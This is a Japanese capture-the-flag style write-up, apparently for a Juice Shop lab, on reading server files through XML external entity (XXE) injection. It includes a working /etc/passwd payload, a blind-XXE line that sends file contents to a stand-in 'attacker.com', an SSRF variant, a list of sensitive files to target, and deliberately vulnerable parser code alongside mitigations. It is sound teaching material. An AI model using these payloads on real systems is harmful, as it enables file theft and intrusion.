# XXE Data Access ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** XXE (XML External Entity)
**目標:** サーバー上のファイルを読み取る

---

## 背景知識

### XXE (XML External Entity) とは

XXE は、**XMLパーサーの機能を悪用して、サーバー上のファイルを読み取る攻撃**。

XMLには「エンティティ」という変数のような仕組みがある。この機能を悪用して、サーバー内のファイルを読み込ませる。

```
┌─────────────────────────────────────────────────────────────────┐
│                     正常なXML処理                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  クライアント                              サーバー              │
│      │                                        │                │
│      │  <order><item>Apple</item></order>     │                │
│      │ ─────────────────────────────────────▶ │                │
│      │                                        │                │
│      │                         XMLパーサーが解析               │
│      │                         「Apple」を商品として処理        │
│      │                                        │                │
│      │  注文完了                              │                │
│      │ ◀───────────────────────────────────── │                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                     XXE攻撃                                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  攻撃者                                サーバー                 │
│      │                                    │                    │
│      │  <!DOCTYPE foo [                   │                    │
│      │    <!ENTITY xxe SYSTEM "file:///etc/passwd">            │
│      │  ]>                                │                    │
│      │  <order><item>&xxe;</item></order> │                    │
│      │ ─────────────────────────────────▶ │                    │
│      │                                    │                    │
│      │              XMLパーサーが &xxe; を展開                  │
│      │              → file:///etc/passwd を読み込む            │
│      │              → &xxe; をファイル内容に置換               │
│      │                                    │                    │
│      │  エラー: "root:x:0:0:..." は無効な商品です              │
│      │ ◀───────────────────────────────── │                    │
│      │                                    │                    │
│      │  👆 /etc/passwd の内容が漏洩！     │                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 日常的な例え

Wordの「差し込み印刷」機能を想像してください:

- **正常な使い方**: 「〇〇様」→ 宛先リストから名前を差し込む
- **XXE攻撃**: 「〇〇様」→ 「サーバーの機密ファイルの内容」を差し込む

XMLパーサーは親切にも「ファイルから内容を読み込んで差し込む」機能を持っている。攻撃者はこの機能を悪用する。

### XMLエンティティの仕組み

```xml
<!-- エンティティ = 変数のようなもの -->
<!DOCTYPE example [
  <!-- 内部エンティティ: 直接値を定義 -->
  <!ENTITY greeting "こんにちは">

  <!-- 外部エンティティ: ファイルやURLから値を読み込む -->
  <!ENTITY secret SYSTEM "file:///etc/passwd">
]>

<root>
  <message>&greeting;</message>  <!-- → "こんにちは" に展開 -->
  <data>&secret;</data>          <!-- → /etc/passwd の内容に展開 -->
</root>
```

---

## 思考プロセス

### ステップ1: XMLを受け入れる機能を探す

```
「アプリケーションでXMLを使う場所はどこ？」
    ↓
「ファイルアップロード機能がある（苦情フォーム）」
    ↓
「DevToolsで確認: accept 属性を変更すればXMLをアップロードできる」
    ↓
「XMLがサーバーで処理されるなら、XXEが効くかも」
```

### ステップ2: XXEが効くか確認

```
「まずシンプルなXXEペイロードを試す」
    ↓
「/etc/passwd を読めるか確認」
    ↓
「Linux/Unixなら必ず存在し、誰でも読み取れるファイル」
    ↓
「これが読めれば、他のファイルも読める可能性大」
```

### ステップ3: ペイロードの構築

```
「必要な要素:」
    ↓
「① DOCTYPE宣言で外部エンティティを定義」
「② SYSTEM キーワードでファイルパスを指定」
「③ XML本文で &エンティティ名; で参照」
```

---

## 実行手順

### Step 1: アップロード機能にアクセス

`http://localhost:3000/#/complain` にアクセス（苦情フォーム）

### Step 2: ファイル入力の制限を解除

DevTools (F12) でファイル入力欄の `accept` 属性を削除:

```html
<!-- Before -->
<input type="file" accept=".pdf,.zip">

<!-- After (accept属性を削除) -->
<input type="file">
```

### Step 3: XXEペイロードを作成

以下の内容で `xxe.xml` を作成:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

### Step 4: ファイルをアップロード

作成した `xxe.xml` をアップロード

### Step 5: 結果を確認

サーバーのレスポンスやエラーメッセージに `/etc/passwd` の内容が含まれる:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

---

## ペイロードの詳細解説

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

| パート | 役割 |
|--------|------|
| `<?xml ... ?>` | XML宣言（バージョンとエンコーディング） |
| `<!DOCTYPE foo [...]>` | ドキュメントタイプ定義（DTD）の開始 |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | 外部エンティティの定義 |
| `SYSTEM` | 外部リソースを参照するキーワード |
| `file:///etc/passwd` | 読み込むファイルのURI |
| `&xxe;` | 定義したエンティティへの参照（展開される） |

### URI スキーム

XXEで使えるURIスキーム:

| スキーム | 用途 | 例 |
|----------|------|-----|
| `file://` | ローカルファイル | `file:///etc/passwd` |
| `http://` | HTTPリクエスト | `http://attacker.com/steal?data=` |
| `https://` | HTTPSリクエスト | `https://internal-api/` |
| `ftp://` | FTPリクエスト | `ftp://attacker.com/` |
| `php://` | PHPストリーム | `php://filter/convert.base64-encode/resource=index.php` |

---

## なぜ /etc/passwd を最初に試すのか

### 理由1: 必ず存在するファイル

Unix/Linuxシステムなら、`/etc/passwd` は必ず存在する。存在しないファイルを指定するとエラーになり、攻撃が成功したか判断できない。

### 理由2: 誰でも読み取り可能

```bash
$ ls -la /etc/passwd
-rw-r--r-- 1 root root 2849 Jan 15 10:00 /etc/passwd
#     ^^^ 全ユーザーが読み取り可能
```

### 理由3: センシティブだが致命的ではない

パスワードハッシュは別ファイル（`/etc/shadow`）にあるため、直接的な認証情報漏洩にはならない。しかし、ユーザー名一覧は取得できる。

### /etc/passwd の読み方

```
root:x:0:0:root:/root:/bin/bash
│    │ │ │ │    │     └─ シェル
│    │ │ │ │    └─ ホームディレクトリ
│    │ │ │ └─ GECOS（フルネームなど）
│    │ │ └─ グループID
│    │ └─ ユーザーID
│    └─ パスワード（x = 別ファイルに保存）
└─ ユーザー名
```

---

## 他に読める可能性のあるファイル

```
/etc/passwd          # ユーザー一覧
/etc/hosts           # ホスト設定
/proc/self/environ   # 環境変数（機密情報を含む可能性）
/var/log/apache2/access.log  # Webサーバーログ
~/.bash_history      # コマンド履歴
/etc/nginx/nginx.conf        # Nginx設定
/var/www/html/config.php     # アプリケーション設定
```

---

## 脆弱なコードパターン

```javascript
// ❌ 脆弱なコード
const libxmljs = require('libxmljs');

app.post('/upload', (req, res) => {
  const xml = req.body;
  // 外部エンティティの処理を許可（デフォルトで有効な場合あり）
  const doc = libxmljs.parseXml(xml, {
    noent: true  // エンティティを展開
  });
  // ...処理
});
```

### 安全な実装

```javascript
// ✅ 安全なコード
const libxmljs = require('libxmljs');

app.post('/upload', (req, res) => {
  const xml = req.body;
  // 外部エンティティを無効化
  const doc = libxmljs.parseXml(xml, {
    noent: false,     // エンティティ展開を無効化
    nonet: true,      // ネットワークアクセスを無効化
    dtdload: false,   // 外部DTD読み込みを無効化
    dtdattr: false    // DTD属性を無効化
  });
  // ...処理
});
```

### 言語別の対策

| 言語/ライブラリ | 対策 |
|----------------|------|
| Java (DocumentBuilderFactory) | `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` |
| PHP (libxml) | `libxml_disable_entity_loader(true)` |
| Python (lxml) | `etree.XMLParser(resolve_entities=False)` |
| .NET | `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit` |

---

## XXE攻撃のバリエーション

### 1. 基本的なXXE（このチャレンジ）
ファイルを直接読み取り、レスポンスに含める

### 2. Blind XXE
レスポンスにファイル内容が含まれない場合、外部サーバーに送信:

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % exfil SYSTEM "http://attacker.com/?data=%file;">
  %exfil;
]>
```

### 3. XXE → SSRF
内部ネットワークへのアクセス:

```xml
<!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
```

### 4. XXE → DoS (Billion Laughs)
→ [XXE DoS](../difficulty-5-6/xxe-dos.md) チャレンジ

---

## 対策まとめ

| 対策 | 説明 |
|------|------|
| **外部エンティティを無効化** | パーサー設定で SYSTEM, PUBLIC を禁止 |
| **DTDを無効化** | DOCTYPE宣言自体を拒否 |
| **入力検証** | XMLスキーマで許可する構造を制限 |
| **最小権限** | XMLパーサーの実行権限を最小化 |
| **WAF** | XXEパターンをブロック |

---

## 関連チャレンジ

- [Deprecated Interface](../difficulty-2/deprecated-interface.md) - XMLアップロード機能の発見
- [XXE DoS](../difficulty-5-6/xxe-dos.md) - Billion Laughs攻撃

## 参考リンク

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger - XXE Injection](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
